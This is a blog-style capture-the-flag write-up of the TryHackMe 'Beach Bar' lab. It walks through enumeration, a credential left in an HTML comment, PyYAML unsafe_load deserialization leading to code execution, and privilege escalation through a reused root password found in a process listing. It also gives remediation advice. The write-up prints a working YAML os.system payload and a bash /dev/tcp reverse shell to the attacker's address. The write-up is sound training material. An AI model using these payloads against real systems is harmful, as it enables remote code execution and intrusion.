---
layout: post
title: "THM: Beach Bar"
date: 2026-08-01
category: "Web Exploitation"
difficulty: "Easy"
tags: [thm, hacker-holidays, boot2root, yaml, deserialization, rce, reverse-shell, privilege-escalation, credential-reuse]
excerpt: "A beach bar jukebox that parses playlists with yaml.unsafe_load, which is a fancy way of saying it runs whatever you paste at it. The exploit was quick once I understood it. What actually ate my evening was my VPN, my own netcat listener, and a firewall I set up on my own attack box that was silently eating every reverse shell."
---

This one is a proper boot2root, and the first thing I want to say about it is that
the box was not the hard part. The box is rated Easy and it deserves that rating.
What made this a roughly ninety minute grind instead of a twenty minute one was
everything around the exploit: my VPN, my listener, and, best of all, a firewall I
had set up on my own laptop that was quietly dropping every reverse shell before it
could reach me. So this writeup is two stories stacked on top of each other. There's
the clean exploit chain, which is genuinely worth knowing, and then there's the
saga of me fighting my own environment, which is the part I think will actually save
another beginner some pain.

It's part of TryHackMe's Hacker Holidays 2026 event, so same Byte Lotus universe as
the other rooms, except this time we're at a beach bar. The theme is a jukebox with
a song queue that, in the flavour text, "accepts a little more than song titles,"
and the machine is "wired straight into the floor with the trimmings still attached."
As with every room in this event, that's the whole vulnerability written out in
holiday language: user input flows into something that parses it unsafely. Standard
disclaimer first, this is a deliberately vulnerable lab built to be broken for
practice, nothing here is a real service.

One housekeeping note before anything else, because it caught me out. The target IP
changed every time the box redeployed. It started life at `10.128.154.31`, came back
as `.112` after one reset, and `.117` after another. That is normal for these rooms,
but if you've written an IP down somewhere, or worse baked it into a payload, a reset
will quietly invalidate it. More on that later, because it bit me hard.

## Enumeration

Usual opener, a full scan to see what's actually listening:

```bash
sudo nmap -sC -sV -A <TARGET_IP>
```

Only two ports, which is refreshingly focused:

```
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu
80/tcp open  http  Gunicorn
```

SSH I filed away, no creds for it yet. Port 80 is the interesting one. The server
header says **Gunicorn**, which is a Python WSGI server. So this isn't a static site
or a PHP app, it's a Python web application, and that single fact ends up being the
whole ball game. Keep it in your head.

Nothing to click on the front end meant directory enumeration next:

```bash
gobuster dir -u http://<TARGET_IP> \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html
```

The result told a clear story on its own:

```
/login       (Status: 200)
/dashboard   (Status: 302) --> /login
/export      (Status: 302) --> /login
/import      (Status: 302) --> /login
/logout      (Status: 302) --> /login
```

Everything interesting, the dashboard, an export, an import, all of it 302 redirecting
back to `/login`. So the whole app is behind authentication, and the only door I could
actually open was the login page itself. Which meant the login page is where I needed
to look.

## The credentials were in the page source

Here's the bit I want to be honest about, because I did the beginner thing first. I saw
a login form and immediately started throwing SQL injection payloads at it. `' OR 1=1--`
and friends. Nothing. I burned a good few minutes on that before I did the thing I
should have done first, which is just read the HTML.

Right there in the source of `/login` was a developer comment somebody left in on a
deadline:

```html
<!-- staff note: the demo DJ login is still enabled for the soft opening.
     dj / dj  -- swap this before the season starts (ticket BAR-7) -->
```

`dj` / `dj`. Logged straight in. The lesson here is one I keep having to relearn: read
the source before you start attacking. The answer was sitting in plain text, and I'd
been firing payloads at a login that had a working credential commented three lines
above the form. View source is free and it's fast, do it first.

## The actual vulnerability: unsafe YAML deserialization

Once I was in, the dashboard let me manage a playlist, and the interesting feature was
`/import`. It accepts a playlist as YAML, either pasted into a textbox or uploaded as a
file. And this is where that "it's a Python app" note from the nmap scan pays off.

When a Python app parses YAML, it usually uses the PyYAML library. PyYAML has two ways
to load: `yaml.safe_load()` and `yaml.unsafe_load()` (the second is also what you get
from a plain `yaml.load()` with the full Loader). The difference is enormous. Safe
loading only ever gives you back basic data, strings, numbers, lists, dictionaries.
Unsafe loading will happily construct arbitrary Python objects from special YAML tags.

That last part is the vulnerability. YAML supports a tag like
`!!python/object/apply:os.system`, and when an unsafe loader hits that tag while
parsing, it doesn't just read it as text, it actually calls `os.system` with whatever
argument you gave it. So the moment an app parses attacker-controlled YAML with
`unsafe_load`, pasting a playlist stops being pasting a playlist and becomes running
commands on the server. The jukebox "with the trimmings still attached" is exactly
this: the parser was left wired up in its dangerous mode.

## Proving code execution before going for a shell

The disciplined move is to confirm you actually have execution before you try anything
fancy, so my first payload just ran a harmless command. The import result echoed back
the return code from `os.system`, and a `0` came back, which is the shell's way of
saying "that command ran and succeeded." That was the confirmation. I had code
execution on the box, no shell yet, but the door was open.

## The reverse shell, and where the evening went sideways

The plan from here is textbook. Use that execution to fire a reverse shell back to a
netcat listener on my machine, and catch an interactive session. My payload looked like
this:

```yaml
!!python/object/apply:os.system
- 'echo <BASE64> | base64 -d | bash'
```

where `<BASE64>` is the base64 encoding of a standard bash reverse shell:

```bash
bash -i >& /dev/tcp/<TUN0_IP>/4444 0>&1
```

The reason for the base64 wrapping is practical. When you drop a raw reverse shell
string with all its quotes and redirects (`>&`, `0>&1`) into a YAML value that's then
handed to a shell, the special characters get mangled on the way through and the payload
breaks. Encoding the whole thing to base64 turns it into one clean blob of letters and
numbers with no shell metacharacters, and you only decode it back to the real command at
the very last second on the target with `base64 -d | bash`. Plain payload kept failing,
base64 wrapped one worked. That's a trick worth keeping.

And on my listener:

```bash
nc -lvnp 4444
```

That's the theory. In practice, this is where I spent most of my time, and every single
obstacle was something I'd done to myself. I'm going to lay them all out because I don't
think I'm the only beginner who'll hit these.

**The VPN kept moving my IP.** I had two OpenVPN config files for the lab, a TCP one and
a UDP one. I kept switching between them, and each switch dropped me on a different
subnet: sometimes my `tun0` address was `192.168.192.x`, sometimes `192.168.162.x`. The
problem is that the reverse shell payload has my IP baked into it. So I'd generate a
payload with one address, switch configs to "fix" a connection problem, and now the IP
in my already-fired payload was pointing at an address I no longer had. The shell would
call home to nobody. The fix was almost stupidly simple: pick one config (UDP was stable
for me), connect once, and then leave it completely alone. Don't Ctrl-C it, don't switch,
don't touch it. `ip a show tun0` to see your real current address, put that in the
payload, and don't change anything underneath it.

**Box redeploys made it worse.** Every time I reset the box I got a new target IP, and
the reset also seemed to jostle the VPN. So I was chasing a moving target on both ends at
once. Once I realised that, I stopped resetting the box for no reason. Reset only when you
actually have to.

**I kept killing my own listener.** This one is embarrassing but common. I'd start
`nc -lvnp 4444`, then realise I needed to run another command, so I'd Ctrl-C the netcat to
free up the terminal, run my thing, and then fire the payload. Except now nothing was
listening, because I'd just killed the listener. The callback would arrive at a closed
door. The fix is to give netcat its own terminal and never touch that terminal again. Do
everything else in a second terminal. One window listens, forever, and you leave it alone.

**And then the big one, my own firewall.** After sorting all of the above I still had
nothing. Netcat was definitely listening, the IP in the payload was definitely correct,
the payload definitely executed (that `os.system` return code again), and yet no shell.
Worse, the return code was now non-zero, meaning the command was running but failing.
That non-zero code was the clue I almost missed.

The thing I'd forgotten is that a while back I had hardened my own attack laptop with
`ufw`, and I'd set the inbound policy to drop everything:

```
Chain INPUT (policy DROP)
```

That's good hygiene for a machine you carry around. But think about what a reverse shell
actually is. It is an inbound connection. The target connects back to me. So my own
firewall, doing exactly what I told it to, was silently dropping every callback before
netcat ever saw it. My hardening was eating my shells. The fix is one line:

```bash
sudo ufw allow in on tun0
```

That says "trust inbound traffic, but only on the VPN interface." It opens the door for
the lab traffic I invited in over `tun0`, while my real network interface stays locked at
the default drop. The instant I ran that, the very next payload connected. Shell.

```
bartender@tryhackme-2404:/opt/beach-bar/webapp$
```

The takeaway I've written down and don't intend to forget: hardening your pentest box is
a good instinct, but a too-tight inbound policy will quietly eat your reverse shells and
give you no error to explain why. If you use a firewall on your attack machine, allow
inbound on your lab interface (`tun0`, and `tun1` if you're on Hack The Box too). Trust
the traffic you invited, nothing else.

## User flag

Landed as the `bartender` user, so the user flag was one command away:

```bash
cat /home/bartender/user.txt
# THM{[redacted]}
```

Leaving the value out, same as always. The point is the path, not the string.

## Root: credential reuse hiding in plain sight

With a foothold as `bartender`, the privesc turned out to be one of the cleaner lessons
on the box, and it's the kind of thing that shows up constantly in real environments too.

`sudo -l` didn't hand me anything, so I went looking at what was actually running. A
plain `ps aux` is one of the first things I check now, because processes running as root
sometimes carry their secrets right there in the command line for anyone who can list
them. And this box did exactly that:

```
root  /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

There's a jukebox streaming daemon running as root, and its stream password,
`SunsetSpritz2024!`, is sitting in plain sight in the process list. Now, a stream password
is not a login password. There's no reason it should get me anything. Except people reuse
passwords, and the whole point of this part of the box (the root flag basically tells you
so afterwards) is that the same secret was reused for the root account. So I just tried it:

```bash
su root
# Password: SunsetSpritz2024!
```

And that was root.

```bash
cat /root/root.txt
# THM{[redacted]}
```

The lesson is that a secret is a secret wherever it lives. A password that was only ever
meant to authenticate a music stream got reused as the root password, and because it was
passed as a command-line argument, every user on the box could read it straight out of
`ps`. Two mistakes stacked: secrets on the command line, and one password doing two jobs.

## How to actually fix this box

Because it's a lab, it's worth stating plainly what the real fixes are, since every bug
here maps to a common real-world one.

- **The YAML bug:** use `yaml.safe_load()` instead of `yaml.unsafe_load()` (or
  `yaml.load()` with `SafeLoader`). Safe loading refuses to construct arbitrary Python
  objects, so the `!!python/object/apply` tag becomes inert text and the whole attack
  dies. If you're parsing anything a user can influence, safe load is the only correct
  choice.
- **The commented-out credential:** don't ship debug logins, and don't leave secrets in
  source comments. That `dj/dj` note with its own ticket number is painfully realistic.
- **The password on the command line:** don't pass secrets as process arguments, they're
  world-readable in `ps`. Use an environment file or a secrets manager.
- **The reuse:** one password, one job. The root account should never share a secret with
  a service daemon.

## What I took away

- The exploit was the easy part. My environment fought me harder than the target did, and
  every obstacle was self-inflicted and fixable. That's oddly encouraging.
- **Read the source before you attack.** I threw SQLi at a login that had a working
  credential commented above the form. View source first, every time.
- **"It's a Python app" is a finding.** The Gunicorn banner is what told me a YAML import
  might be `unsafe_load`. Match the vuln to the stack.
- **Base64-wrap reverse shells** to get quotes and redirects through a parser intact.
- **Pin your environment down.** One VPN config, connected once, left alone. One terminal
  that only ever listens. Don't chase a target that you keep making move.
- **Your own firewall can eat your shells.** A drop-by-default inbound policy is good
  security and a silent reverse-shell killer. `sudo ufw allow in on tun0`.
- **Check `ps aux` for privesc.** Root processes leak secrets on the command line, and a
  reused password is a free ride to root.

One more habit this box taught me, almost by accident: because it took so long and I kept
losing my place, I started reconstructing the whole chain from memory at the end, writing
out each step in order. Doing that is what made half these lessons click, because I could
see clearly which problems were the box and which were me. I'd recommend it. When you
finish a room, close the notes and try to retell the exploit start to finish. The gaps you
hit are the things you didn't actually understand yet.

> Room: Beach Bar on TryHackMe (Hacker Holidays 2026), Boot2Root, Easy, 60 points.
> Flags left out on purpose as always. A genuinely tidy little RCE chain, and a great
> reminder that on an easy box your own setup is often the real boss fight.
